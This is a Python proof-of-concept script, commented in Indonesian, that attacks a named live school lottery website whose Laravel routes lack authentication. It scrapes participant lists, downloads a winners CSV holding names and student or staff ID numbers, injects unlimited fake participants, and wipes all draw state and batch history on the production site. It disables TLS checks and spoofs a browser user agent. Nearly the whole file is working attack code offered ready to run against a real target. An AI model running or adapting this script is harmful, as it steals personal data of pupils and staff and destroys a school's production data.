#!/usr/bin/env python3
"""
PoC: spinner.smpm12gkb.sch.id — panel undian tanpa autentikasi
=============================================================
Aplikasi Laravel "Neobrutalism Lucky Draw" tidak memasang middleware auth
pada satu pun route. Akibatnya, siapa pun di internet dapat:

  * membaca seluruh data peserta (897 baris, 45 halaman)
  * mengekspor CSV pemenang berisi nama + ID (NIS/NIP)
  * menambah peserta tanpa batas lewat import-quick
  * mereset seluruh status undian dan menghapus riwayat batch

Tidak ada endpoint unggah berkas di aplikasi ini. Permukaan yang dapat
disalahgunakan adalah import teks (tanpa batas jumlah baris).

Mode
----
  stats                 ringkasan jumlah peserta/pemenang per kategori
  manage                daftar peserta (halaman, default 1)
  wheel                 nama yang masih tersedia untuk diundi
  export-csv            unduh CSV pemenang (PII) ke berkas lokal
  import --category C --names "A\nB"
                        tambah peserta tanpa autentikasi (MENULIS DATA)
  reset --yes-destroy   reset semua status + hapus batch (MERUSAK DATA)

Contoh
------
  python3 poc_spinner_unauth.py stats
  python3 poc_spinner_unauth.py export-csv --out pemenang.csv
  python3 poc_spinner_unauth.py import --category kelas_7 --names-file names.txt
  python3 poc_spinner_unauth.py reset --yes-destroy

Catatan: mode import dan reset mengubah data produksi. Default menolak
menjalankan reset tanpa --yes-destroy.
"""

import argparse
import json
import re
import sys

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://spinner.smpm12gkb.sch.id"
CATEGORIES = ["guru", "karyawan", "kelas_7", "kelas_8", "kelas_9"]


class Spinner:
    def __init__(self, base=BASE, timeout=30.0):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers["User-Agent"] = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/124.0 Safari/537.36"
        )

    def token(self):
        r = self.s.get(f"{self.base}/kelola-peserta", timeout=self.timeout)
        r.raise_for_status()
        m = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
        if not m:
            raise RuntimeError("CSRF token tidak ditemukan di /kelola-peserta")
        return m.group(1)

    def stats(self):
        r = self.s.get(f"{self.base}/api/lottery/stats", timeout=self.timeout)
        r.raise_for_status()
        return r.json()

    def wheel(self):
        r = self.s.get(f"{self.base}/api/lottery/wheel-names", timeout=self.timeout)
        r.raise_for_status()
        return r.json()

    def manage(self, page=1):
        r = self.s.get(
            f"{self.base}/kelola-peserta", params={"page": page}, timeout=self.timeout
        )
        r.raise_for_status()
        rows = re.findall(r"<tr[\s\S]{0,900}?</tr>", r.text)
        out = []
        for row in rows:
            cells = [
                re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", c)).strip()
                for c in re.findall(r"<td[\s\S]{0,300}?</td>", row)
            ]
            if len(cells) >= 4:
                out.append(cells)
        return out

    def export_csv(self, out_path):
        r = self.s.get(
            f"{self.base}/riwayat/export-csv", timeout=self.timeout, stream=True
        )
        r.raise_for_status()
        with open(out_path, "wb") as fh:
            for chunk in r.iter_content(8192):
                fh.write(chunk)
        return out_path, r.headers.get("content-disposition", "")

    def import_names(self, category, names):
        if category not in CATEGORIES:
            raise ValueError(f"category harus salah satu dari {CATEGORIES}")
        payload = {
            "_token": self.token(),
            "category": category,
            "names_text": "\n".join(names),
        }
        r = self.s.post(
            f"{self.base}/kelola-peserta/import-quick",
            data=payload,
            timeout=self.timeout,
        )
        r.raise_for_status()
        return r.status_code, r.url

    def reset(self):
        payload = {"_token": self.token()}
        r = self.s.post(
            f"{self.base}/api/lottery/reset-all", data=payload, timeout=self.timeout
        )
        r.raise_for_status()
        return r.json()


def main():
    ap = argparse.ArgumentParser(description="PoC undian tanpa autentikasi")
    ap.add_argument(
        "mode", choices=["stats", "manage", "wheel", "export-csv", "import", "reset"]
    )
    ap.add_argument("--base", default=BASE)
    ap.add_argument("--page", type=int, default=1)
    ap.add_argument("--out", default="pemenang.csv")
    ap.add_argument("--category", default="kelas_7")
    ap.add_argument("--names", help="nama dipisah newline (literal \\n didukung)")
    ap.add_argument("--names-file")
    ap.add_argument("--yes-destroy", action="store_true")
    ap.add_argument("--timeout", type=float, default=30.0)
    args = ap.parse_args()

    sp = Spinner(args.base, args.timeout)

    if args.mode == "stats":
        print(json.dumps(sp.stats(), indent=2))
    elif args.mode == "wheel":
        d = sp.wheel()
        people = d.get("participants") or d.get("names") or []
        print(f"available: {len(people)}")
        for p in people[:10]:
            print(" ", p)
    elif args.mode == "manage":
        for row in sp.manage(args.page):
            print(" | ".join(row[:5]))
    elif args.mode == "export-csv":
        path, disp = sp.export_csv(args.out)
        print(f"saved: {path}")
        print(f"header: {disp}")
        with open(path, "rb") as fh:
            lines = fh.read().decode("utf-8-sig", "replace").splitlines()
        print(f"rows: {len(lines) - 1}")
    elif args.mode == "import":
        if args.names_file:
            names = [
                l.strip()
                for l in open(args.names_file, encoding="utf-8").read().splitlines()
                if l.strip()
            ]
        elif args.names:
            names = [n.strip() for n in args.names.replace("\\n", "\n").splitlines() if n.strip()]
        else:
            print("butuh --names atau --names-file", file=sys.stderr)
            return 2
        code, url = sp.import_names(args.category, names)
        print(f"import: http={code} lines={len(names)} -> {url}")
        print("stats:", json.dumps(sp.stats().get("total_participants")))
    elif args.mode == "reset":
        if not args.yes_destroy:
            print("reset merusak data produksi; tambahkan --yes-destroy", file=sys.stderr)
            return 2
        print(json.dumps(sp.reset(), indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
